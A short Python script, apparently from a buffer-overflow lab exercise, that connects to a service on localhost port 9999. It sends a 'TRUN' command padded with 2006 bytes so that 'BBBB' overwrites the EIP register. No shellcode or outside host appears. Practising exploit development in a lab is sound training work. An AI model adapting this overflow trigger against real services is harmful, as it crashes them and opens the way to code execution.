import socket

dest = '127.0.0.1'
dport = 9999
distance_to_eip='A' * 2006
eip_overwrite='BBBB'
padding= 'F' * 990

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((dest, dport))
s.recv(100)
s.send('TRUN .' + distance_to_eip + eip_overwrite + padding)
print(s.recv(100))
s.send('EXIT\r\n')
print(s.recv(100))
s.close()
